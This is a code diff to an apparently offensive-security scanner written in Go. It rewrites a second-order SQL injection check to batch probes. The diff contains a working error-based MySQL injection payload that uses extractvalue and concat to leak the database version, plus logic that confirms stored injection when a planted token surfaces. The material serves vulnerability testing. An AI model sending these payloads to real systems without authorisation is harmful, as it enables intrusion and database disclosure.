@@ -349,17 +349,72 @@ func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, ca
 	if len(writes) > 20 {
 		writes = writes[:20]
 	}
+	// Plant a UNIQUE reflection-proof hex token in every write first, then read
+	// each rendering page once (two rounds only for eventual consistency). The old
+	// nested loop re-read up to 30 pages after EACH of 20 fields: 620 requests.
+	// Batching preserves exact write attribution while reducing that worst case to
+	// 20 + 2*30 = 80 requests.
+	type plantedWrite struct {
+		ip    insertionPoint
+		token string
+	}
+	plants := make([]plantedWrite, 0, len(writes))
 	for _, w := range writes {
 		if ctx.Err() != nil {
 			return
 		}
-		if kind, ev := s.secondOrderProbe(ctx, w, readURLs, auth); kind != "" {
-			s.store(targetID, "sqli", "high", w, kind, ev)
-			found.Add(1)
-			logFn("warn", "sqli", fmt.Sprintf("Second-order SQLi CONFIRMED: %s param=%s", w.URL, w.Param))
-			s.notify(targetID, w.URL, w.Param)
+		token := strings.ToUpper(newXSSToken("RCNS2"))
+		tokenHex := hex.EncodeToString([]byte(token))
+		payload := fmt.Sprintf("z' AND extractvalue(1,concat(0x7e,0x%s,0x7e,version()))-- -", tokenHex)
+		_, _ = sendInjected(ctx, sqliHTTPClient, w, payload, auth)
+		plants = append(plants, plantedWrite{ip: w, token: token})
+	}
+
+	matched := make(map[string]bool, len(plants))
+	for round := 0; round < 2 && len(matched) < len(plants); round++ {
+		for _, u := range readURLs {
+			if ctx.Err() != nil {
+				return
+			}
+			body := sqliGet(ctx, u, auth)
+			if body == "" || fingerprintDBMS(body) != "mysql" {
+				continue
+			}
+			for _, p := range plants {
+				key := insertionIdentity(p.ip)
+				if matched[key] || !strings.Contains(body, p.token) {
+					continue
+				}
+				// The request carried the token only as hexadecimal. Its ASCII form
+				// in a MySQL/XPath error therefore proves DB evaluation rather than
+				// reflection, exactly like the historical one-at-a-time probe.
+				ev := fmt.Sprintf("second-order (stored) SQLi PROVEN: a payload written via parameter %q (%s) later surfaced a MySQL error leaking the reflection-proof token %q when %s rendered; the token was sent only as a hex literal", p.ip.Param, p.ip.Method, p.token, u)
+				if ver := extractLeakedVersionForMarker(body, p.token); ver != "" {
+					ev += fmt.Sprintf(" (leaked version: %s)", ver)
+				}
+				s.store(targetID, "sqli", "high", p.ip, "error_based", ev)
+				found.Add(1)
+				matched[key] = true
+				logFn("warn", "sqli", fmt.Sprintf("Second-order SQLi CONFIRMED: %s param=%s", p.ip.URL, p.ip.Param))
+				s.notify(targetID, p.ip.URL, p.ip.Param)
+			}
 		}
 	}
+}
+
+func extractLeakedVersionForMarker(resp, marker string) string {
+	i := strings.Index(resp, marker)
+	if i < 0 {
+		return ""
+	}
+	rest := strings.TrimLeft(resp[i+len(marker):], "~ ")
+	if j := strings.IndexAny(rest, "'\"<>\n\r\t"); j >= 0 {
+		rest = rest[:j]
+	}
+	if len(rest) > 60 {
+		rest = rest[:60]
+	}
+	return strings.TrimSpace(rest)
 }
 
 // errorForceProbe runs the DBMS-adaptive error-forced extraction over an insertion
